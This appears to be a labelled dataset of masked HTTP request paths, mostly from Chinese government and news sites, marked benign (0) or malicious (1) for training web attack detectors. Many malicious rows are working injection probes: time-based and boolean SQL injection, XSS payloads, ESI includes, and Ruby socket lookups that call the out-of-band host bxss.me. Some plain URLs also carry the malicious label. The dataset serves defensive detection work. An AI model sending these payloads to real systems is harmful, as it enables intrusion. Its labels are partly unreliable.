request	label
/zwxx_11337/****/index_33.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5929\u6210\u9632\u6c34\u4fdd\u6e29\u5730\u70ed\u6750\u6599\u6279\u53d1\u90e8	0
/****************/images/crm/default/wallet/img_wallet_changepwd.png	0
/enjoymobilexcx_mt/****/downloadimage/?id=bb63b3f4-e22d-454d-bdbe-e093bda3cc1b	0
/****/zt/msss/msxw/201505/t20150505_325653.html	0
/***********/jinrongqihuo/guzhiqihuo/2021-09-24/1949.html	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u820c\u5c16\u5c0f\u5403\u5e97	0
/****/zdlygk/ncwywfgz/if(now()=sysdate(),sleep(12),0)/ltq/xmb_gzdxb.htm	1
/************/investment-advisory/2019-04-0'xor(if(now()=sysdate(),sleep(3),0))xor'z/270.html	1
/*****/admin/upgrade_unattended.php?db_type=<script>alert(777)</script>	1
/**/system/2020/08/21/javascript:void(0);	1
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1	1
"/***/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror=""alert(777)""/>"	1
/***/0/01/42/58/1425808_774900.png	0
/***/interface/comul_total.json.jsp?callback=jquery19103932360613903043_1640025097518	0
/**********/system/2021/11/25/013485253.shtml	0
/*******/zwgk/zfxxgk/fdzdgknr/zdmsxx/spyp_40928/	0
/**/mediacenter/news/202010/t20201028_255095.html	0
"/****/byszf/201610/t20161016_546.html?leader=' 'a'.concat(70-3).concat(22*4).concat(97).concat(71).concat(98).concat(70) (require'socket'
socket.gethostbyname('hithg' 'dfsyrqxz88db6.bxss.me.')[3].to_s) '"	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u9f99\u7965\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/jtdt/2015_jtdt/	1
/**/wp-admin/admin-ajax.php	1
"/************/interfaces/autocomplete.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词<esi:include src=""""http://bxss.me/rpb.png""""/>&searchid=1&tpl=16&websiteid=110105008056111"	1
/******/admin/index.php?o=panel&a=receiver.edit&id=alert(777)	1
/****/201911/t20191106_1840777.html	0
/****/system/2021/03/09/javascript:window.close();	1
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqmzt/201802/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5218\u793c\u5e72\u679c\u5e97	0
/***/webinterface/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783	1
/****/zgsdt/2020_qydt/202005/t20200520_247445.html	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6587\u5a1f\u8d27\u8fd0\u90e8	0
/*******/lmfim2.php	1
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/202002	0
/*****/20200810/8469.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u805a\u7f8e\u533b\u7597\u54a8\u8be2\u6709\u9650\u516c\u53f8	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtdejegsmos7j7gfx6tfh14a=&openid=ovl7jjsi4s-gaie-lwwqx28tk4l4&outer_str=4882&activate_ticket=fdzv9emqaffrnr3xboqhbx35c5/mpamwc3dhlsyyfkxhfifidrt1ejnprxbtx1zvspxifldvolt7oe9t1yvnziqk64v1kf237fsnuukof1w=	0
/****/\ufffd\ufffd\ufffd\ufffd\u0226\ufffd\ufffd\ufffd\u07f8\ufffd\ufffd\ufffd	0
/*************/zwgk/tzgg/202112/t20211210_3214435.html	0
/******/system/2021/03/08/javascript:void(0);	1
/**/system/2021/12/14/012230169.shtml	0
/zwxx_11337/****/201712/t20171227_653846.html	0
/**/system/count/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/category/quanqiuguanzhuredian?page=1 and 9929=9965	1
/****/lkw/yw_1292/202106/t20210622_2894616.html	0
"/********/swfupload//swfupload_f8.swf?moviename=""]);}catch(e){}if(!self.a)self.a=!alert(1);//"	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrti miwdf6qu3yc9znwqiaci=&openid=ovl7jjpjo9y4iz2ppsmujco8bqiu&outer_str=18309&activate_ticket=fdzv9emqaffrnr3xboqhb8yd1w4to7nwnfyvklm8wjhhfifidrt1ejnprxbtx1zvbkwg/g5w100  dp sb7pghd8azukhqyf/9soh7wxqmg=	0
/**/ui/widgets/hanweb/iconfont/css'||'/iconfont.css	1
/if(now()=sysdate(),sleep(15),0)/******/index.html	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5370\u5f97\u7f8e\u5e7f\u544a\u5236\u4f5c\u90e8	0
/*****/index/lists/cate_id/156.html?page=2');select sleep(5)	1
/**********/system/2020/04/10/013137044.shtml	0
"/****/admin/edit.php?menu="""">pt>alert(777); script>pt>"	1
"/***/getlist?data={""channel_id"":""12583"",""channel_type"":""4"",""page"":1,""page_size"":15}"	0
/****/bmkx/jtysj/202012/t20201210_174763.html	0
/**/ui/lib/easyui//xfs.bxss.me/jquery.linkbutton.js	1
/****/bmkx/ygjt/202006/t20200629_168545.html	0
/******/card/department.ashx?organizationid=636129875557735413&usertype=50	1
/****/zzxxgk/bmjyj/xxgkml/lzyj/zcfg_1/list.html	0
/**********/xwdc/javascript:void();	1
/****/qzfwj/201907/t20190716_1607569.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6c38\u5eb7\u9547\u5c0f\u8f69\u7cae\u6cb9\u852c\u83dc\u5e97	0
/****/shouji/65807.htm?rand=2' and 5706=5918 and 'xash'='xash	1
/******/usercenter/index?qrcode=17460	0
/*********/img/2021-12-21/1640054221_171662.jpg	0
/****/businesses-e33948_4.html?category_id=131360	0
/***/interface/comul_total.json.jsp?callback=jquery19105659742132069725_1639972892151	0
/**/system/2021/10/18/javascript:void(0);	1
/****/0815/74722.shtml	1
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5c45\u5b89\u8857\u5c0f\u5218\u9165\u998d\u5e97	0
"/******/system/2021/06/09/013399706'""/>//</script//>//<svg/onload=alert(2340) width=100///>.shtml"	1
/**/jcjd/index.shtml	0
/****/20181127/5923.html	0
/****/2005_506	0
/**********/system/2020/04/05/013132456.shtml	0
/****/bmkx/snmj/202009/w020200917374527103076.png	0
/***/0/01/75/21/1752153_373978.jpg	0
/*******/qiye/cases-e46236.html	0
/****/b-e771377.html	0
"/****/bmkx/scl/202106/"""	0
/**********/system/2021/09/16/013452400.shtml	0
"/************/'""""()&%<acx><script >k6qi(9281)</script>/jcse/110105008056111/16/images/jquery.cookie.js"	1
/****/rest/prototype/1/session/check/something<img src=a onerror=alert(777)>	1
/***/0/00/32/85/328510_998164.jpg	0
/*****/system/2020/07/28/javascript:void();	1
/***/003/003/976/00300397699_i1001920000600be_45e87b4f.jpg	0
/******/visitcount/visit.jsp?i_columnid=if(now()=sysdate(),sleep(15),0)&i_webid=1&type=1	1
/****/202107/t20210723_184928.html	0
/**********/system/2021/12/19/013496709.shtml	0
/****/jtdt/2012jtdt	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u59a5\u71d5\u8d27\u8fd0\u90e8	0
"/*/191211-'""""()&%<acx><script >i44y(9298)</script>/index/543527b53aa888f3c059262ff1665247.css"	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u76ca\u5eb7\u74dc\u679c\u6d41\u901a\u519c\u6c11\u4e13\u4e1a\u5408\u4f5c\u793e	0
"/***/getlist?data={""page_size"":20,""channel_type"":4,""channel_id"":12225}"	0
/***/interface/daily_clickcount.json.jsp?callback=jquery191014350943603179678_1639973129737	0
/*******/qiye/b-e1559483.html	0
/zwxx_11337/****/201807/t20180720_918368.html	0
/*******/countdoc?siteid=115&docid=1090399	0
/*******/jlcorevalue?id=51 and 4912=4912	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u67d4\u8fdc\u9547\u9646\u51e4\u4e3d\u5546\u5e97	0
/****/xcx/ldhd	0
/***/viewspace-225.html	0
/****/webinterface/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783	1
/***/interface/comul_total.json.jsp?callback=jquery19103196854649560086_1640025397770	0
/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase	1
/***/0/01/06/50/1065013_865793.jpg	0
/**********/system/2012/01/31/javascript:window.external.addfavorite(	1
/****/mswpmm/common/signin.aspx?tbemailaddress=alert(777)returnurl=/mswpmm/common/default.aspx	1
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u78b3\u5316\u7845\u8010\u706b\u6750\u6599\u5382	0
/**********/system/2021/12/20/013497359.shtml	0
/*****/gy48/ljcpgyview.asp?id=42282981&l=\ufffd\ufffd\ufffd\ufffd	0
/****************/notification?access_token=e578d200-c3fc-4ee0-8338-9aef4c86122f&id=undefined	0
/****/bmkx/swjw/202007/t20200715_169344.html	0
/****/web/search?channelid=222832&searchword=\u9676\u4e50\u53bf\u9ad8\u4ec1\u9547\u4f9b\u9500\u5408\u4f5c\u793e\u767e\u8d27\u95e8\u5e02\u90e8	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8bda\u4fe1\u7cae\u6cb9\u8c03\u6599\u5e97	0
"/**/abantecart/index.php?currency=""><script>alert(777);</script>&product_id=109""><script>alert(777);</script>&rt=product/product"	1
/*******/qiye/businesses-e40497_6.html?category_id=	0
/****/ycl/ldhd	0
/************/template'||'/jcse/110105008056111/16/images/plugin/voice/hzrecorder.js	1
/***/0/02/08/47/2084702_692867.jpg	0
"/****/openemr/?site="""">alert(777);"	1
/******/system/2016/09/26/012143006.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u6f6e\u6b4c\u4f11\u95f2\u5427	0
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1&type=1' and 'x'='y	1
/****/b-e1158395.html	0
/***/col35/index%' and 2*3*8=6*8 and 'xr4y'!='xr4y%.html	1
"/************/template/jcse/""'><img src=""/wf_xsrf5301.html"">/16/images/layer/layer.js"	1
"/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419' or 0598=0598 	1
/******/system/2017/10/25/012451388.shtml	0
/******/pagination.min.js	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%') or 1043=1043 and '%'='	1
"/****/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="""">alert(/777/)&false_positives=without&sort=&asc=false&commit=search"	1
/***********/zaojianpinglun/index_8.html	0
/******/web/jpage/dataproxy.jsp?startrecord=46&endrecord=90&perpage=15	0
/**********/system/2021/09/03/013445402.shtml	0
/****/bwcx/zybs/201910/t20191012_224137.html	0
/***/viewspace-905.html	0
/****/bmkx/gjj/	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u66e6\u5915\u68cb\u724c\u6d3b\u52a8\u5ba4	0
/****/20211019/javascript:void(0);	1
/*****/system/2010/06/10/010138997.shtml	1
"/jsearchfront'""""()&%<acx><script >vv4o(9602)</script>/********/jcse/110105008056111/16/images/plugin/hotnews/js.js"	1
/******/resource/code/datainput.jsp?owner=%' and 8453=6167 and '%%'='%	1
/****/czgk/bmyjs/rmtt/wl/201602/t20160222_318519.html	0
/col' and 2*3*8=6*8 and 'jn59'='jn59/******/index.html	1
/***/2009/8/6/art_64_30416.html	0
/****/hhsswzwxw/javascript:void(0);	1
/******/_content/download.jsp?urltype=news.downloadattachurl) and 4334=4334#&owner=1707212448&wbfileid=51419	1
/******/usercenter/index?qrcode=94643&code=011urqfa11nnkc0o5yja1yxfj20urqfh	0
/********/javascript:void(0);	1
/****/system/2019/11/29/javascript:window.close();	1
/****/mycak.php	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u521a\u521a\u9a6c\u94c3\u85af\u7ecf\u7eaa\u4e2d\u5fc3	0
"/****/wdsjs'""""()&%<acx><script >lnxe(9784)</script>/hfswsj/202109/t20210906_186411.html"	1
/****/zzxxgk/bmfgj/bmlcj/xxgkml/jytabl/zxtajg/201904/t20190418_116952.html	0
/*******/qiye/b-e2024388.html	0
/**/aboutus/companyprofile/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u7cbe\u54c1\u670d\u88c5\u5546\u884c	0
/****/20201120/e110769222.html	0
"/****/bysw/swsj/201610/t20161010_456.html?leader=苏君&wvstest=javascript:domxssexecutionsink(1,""""'/""""><xsstag>()locxss"""")"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u7855\u4e30\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
"/***/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""""/>alert(777);"	1
/*******/202011/202011101116401070.html	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19107303137482699205_1639972874483	0
/***/0/02/03/95/2039561_218833.jpg	0
/******/download/downfile.jsp	1
/***/0/02/12/44/2124402_878073.jpg	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqwsb/201808/t20180816_978261.html	0
/****/system/2016/02/21/011937269.shtml	0
"/*/191211-8/index/89f1a343e891a0a00a940d84f9626bcf'""""()&%<acx><script >nz61(9444)</script>.js"	1
/******/xsd/	0
/****/20201027/e109162393.html	0
"/***/getlist?data={""channel_id"":""12232"",""channel_type"":""4"",""page"":1,""page_size"":15}"	0
/**********/system/2020/06/07/013179634.shtml	0
/**********/system/2021/12/16/013495508.shtml	0
/****/zgsdt/2020_qydt/202007/w020200717727105735790.jpg	0
/****/system/2016/08/26/012108451.shtml	0
"/****/zcwjk/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/1.htm"	1
/***/images/zdkhaaa.gif	0
/****/20211202/javascript:void(0);	1
/****/index.php?vyhl='>alert(777)&lang=cze	1
"/****/bmkx/scl/202104/"""	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u60a6\u805a\u9ea6\u57ce\u91cf\u8d29\u5f0f\u97f3\u4e50\u4f1a\u6240	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u89e3\u653e\u4e1c\u8857\u7535\u4fe1\u5408\u4f5c\u8425\u4e1a\u5385	0
/**********/system/2021/03/18/013353036.shtml	1
/zwxx_11337/****/202003/t20200318_1994600.html	0
/******/yzys/images/2.jpg	0
/****/zfwjn/1088/1103/list.html?new=/xfs.bxss.me	1
"/************/categorysearch.do?cateid=1&p=1&q=请输入关键词<esi:include src=""""http://bxss.me/rpb.png""""/>&searchid=1&tpl=16&websiteid=110105008056111"	1
"/******/system/2021/06/09'""/><iframe src=javascript:alert(2333)>/013399706.shtml"	1
"/****/server-session-details.jsp?hostname=""""/>alert(777)"	1
/******/resource/code/datainput.jsp?owner=%' or 4476=4476 and '%'='	1
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12500,""place_id"":""fm_sp_ard"",""news_id"":""864521""}"	0
/***/003/001/158/00300115863_b5299593.jpg	0
/******/system/2021/09/08/013448189.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5fb7\u4e16\u4e94\u91d1\u4ea4\u7535\u7ecf\u9500\u90e8	0
/*******/b9dh99.php	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u674e\u5c0f\u660e\u6d77\u7ef5\u7ecf\u9500\u90e8	0
/****/system/2016/09/13/javascript:window.close();	1
/**********/system/2021/12/17/013495629.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6653\u4e3d\u7f8e\u53d1\u5e97	0
/****/jtdt/2020_jtyw/202007/w020200701475539049837.jpg	0
/zwxx_11337/*******/202005/t20200521_2095255.html	0
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(3630)</script>?_=1630311982284"	1
/****/czgk/bmyjs/zzqjcyxt/yzqrmjcy/201802/t20180223_693097.html	0
/******/isxbg/date.php	1
/****/jsly/lsxxcyzb/201501/t20150129_52383.html and 1=1	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u674e\u5409\u9e4f\u8d27\u8fd0\u90e8	0
/******/system/2019/06/21/012909229.shtml	0
/**/zwxmtjz/tj/wx/201908/w020190822694387059959.jpg	0
"/****/byysqgk/http://bxss.me/t/xss.html?	1
/*******/202007/202007011048131066.html	0
"/*/210719/index/89'""""()&%<acx><script >npdo(9471)</script>.js"	1
/****/bmkx/swjw/201912/t20191231_146021.html	0
/wp-content/*******/emag-marketplace-connector/templates/order/awb-meta-box.php?post=</script><script>alert(document.domain)</script>	1
/investors-garden'||'/**********/graphic/2020-02-27/8981.html	1
/****/bmkx/ssjj/202106/t20210610_183734.html	0
/****/20170411/2940.html	0
/***/interface/url_total_pv.json.jsp?callback=jquery19106057527168572705_1639980517304	0
/***/0/01/32/61/1326187_208848.jpg	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(3494)"">?_=1630311909102"	1
/****/system/2016/11/06/javascript:window.close();	1
/*******/zwgk/czgk/bmyjs/zzqjcyxt/plxrmjcy/	0
"/****/czgk/bmjs/"""" """"a"""".concat(70-3).concat(22*4).concat(117).concat(89).concat(100).concat(75) (require""""socket""""
socket.gethostbyname(""""hitmn"""" """"vsgylejr7384a.bxss.me."""")[3].to_s) """"/"	1
/*******/qiye/b-e2295970.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9648\u8339\u96ea\u7ae5\u88c5\u5e97	0
/******/nxslh-mid-icon03.png	0
/*****/javascript/bootstrap/fonts/glyphicons-halflings-regular.svg	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9e3d\u60a0\u5154\u517b\u6b96\u573a	0
/zwxx_11337/****/202012/t20201207_2393877.html	0
/*******/qiye/b-e2319862.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u6e1d\u51c7\u8d27\u7269\u8fd0\u8f93\u670d\u52a1\u90e8	0
/**********/system/2020/03/18/013118214.shtml	0
/****************/notification/negotiate?access_token=6471cccd-3e8f-4908-be8b-92c5b5f61236	0
/****/tips/tipsloginsubmit.action	1
/****/jjgz/index_2.html	0
/***/0/01/27/66/1276670_542162.jpg	0
"/jsearchfront"""" and 2*3*8=6*8 and """"oqct""""=""""oqct/********/jcse/110105008056111/16/images/main.css"	1
/****/bmkx/jyj/201610/t20161025_9259.html	0
/enjoymobilexcx_mt/****/downloadimage/?id=5d4b2169-b751-4a89-a622-0d8710a40410	0
/****/ilist.jsp?cat_id=2040	0
"/************/' 'a'.concat(70-3).concat(22*4).concat(104).concat(89).concat(111).concat(84) (require'socket'
socket.gethostbyname('hitfh' 'yyxagmlg47350.bxss.me.')[3].to_s) '/jcse/110105008056111/16/images/main.css"	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u4f73\u4e1a\u533b\u7597\u79d1\u6280\u4fe1\u606f\u670d\u52a1\u90e8	0
/****/qzfwj/202012/t20201222_2535639.html	0
/****/zzxxgk/smzw/xxgkml/xzzq_3963	0
/****/rdjy/202012/t20201225_2539358.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u6625\u548c\u8bca\u6240	0
/****/dqgz/201904/t20190403_206331.html	0
/****/web/search?searchword=1&channelid=287219%' or 1586=1586 /*&perpage=24&templet=1&token=1	1
"/************/template/jcse'""""()&%<acx><script >5il4(9870)</script>/110105008056111/16/images/catesearchbtn.js"	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u9ec4\u94f6\u8d22\u519c\u526f\u4ea7\u54c1\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u4e09\u8425\u9547\u5929\u6210\u519c\u4e1a\u6280\u672f\u670d\u52a1\u90e8	0
/****/czgk/bmyjs/rmtt/fxh/201602/t20160225_318448.html	0
/****/bmkx/hszh/202103/t20210315_178604_wap.html	0
/***/interface/comul_total.json.jsp?callback=jquery17105965142347849905_1640025043926	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4eba\u53e3\u4e0e\u8ba1\u5212\u751f\u80b2\u6761\u4f8b	0
/****/czgk/czyjs/202010/t20201023_2266322.html	0
/****************/notification?access_token=661de40c-d8d9-4a14-816d-788c2b0a4c63&id=undefined	0
//***********/21/rest.css	1
/*****/system/2019/01/20/javascript:void();	1
/****/dqgz/202007/t20200721_250964.html	0
/***/toolefficiencyrunningview/getphomepagedata.z	0
/***/gygj/dszzc/xwzx/tzgg/kjcx/qyzz/	0
/****/kjdt/202105/t20210531_279636.html and 1=1	1
/zwxx_11337/****/202004/t20200417_2037435.html	0
/****/jrytz/201704/	1
/****/gjys/' and 'x'='x	1
"/******/qhqy/""><script>alert(23)</script>"	1
"/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""""xor(if(now()=sysdate(),sleep(0),0))or""""*/&perpage=15&outlinepage=10"	1
/zwfw%' and 2*3*8=6*8 and 'i4h2'!='i4h2%/****/1.htm	1
/****/ysqgk/zzqzfzcbm_54580/sy.html?id=76	0
/****/index.html?channelid=222832&searchword=\u6cd5\u6cbb\u653f\u5e9c\u5efa\u8bbe\u60c5\u51b5	0
"/************/search.do?begin=20200819&end=20210819&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&tpl=16&websiteid="	1
/***/viewspace-611.html	0
/zwxx_11337/****/202004/t20200420_2039561.html	0
/*******/qiye/b-e1783888.html	0
/****/20211020/javascript:void(0);	1
/zwxx_11337/****/201904/t20190410_1383428.html	0
/****/system/2009/07/27/002781608.shtml	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%') and 6292=6292 and '%'='	1
//***********/xxgkml/	1
"/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1') or 7972=7972 	1
/******/2016/search.png	0
/**/aboutus	0
/zwxx_11337/****/202001/t20200110_1919738.html	0
/****/system/2021/12/06/javascript:window.print()	1
/***/86-r90.html	0
/****/tjc/	0
/****/czgk/bmyjs/zzqfyxt/zzqgyzzqtlfy	0
"/****/dependencies/index?search="""">alert(/777/)"	1
/***/003/004/341/00300434118_d36974cc.jpg	0
/****/zgsdt/2018_zgsdt/index_4.html	0
/****/zjdt/fdcgl/gzdt%' and 2*3*8=6*8 and 'ap5u'!='ap5u%.htm	1
/****/bmkx/sgxs/202105/w020210528406410946242.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u94f6\u71d5\u4e03\u5f69\u827a\u672f\u5b66\u6821	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u91d1\u864e\u7eb8\u54c1\u7ecf\u9500\u90e8	0
/****/ssgs/gtgy/javascript:stranbody();	1
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0123\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/zwxx_11337/****/201707/t20170727_300846.html	0
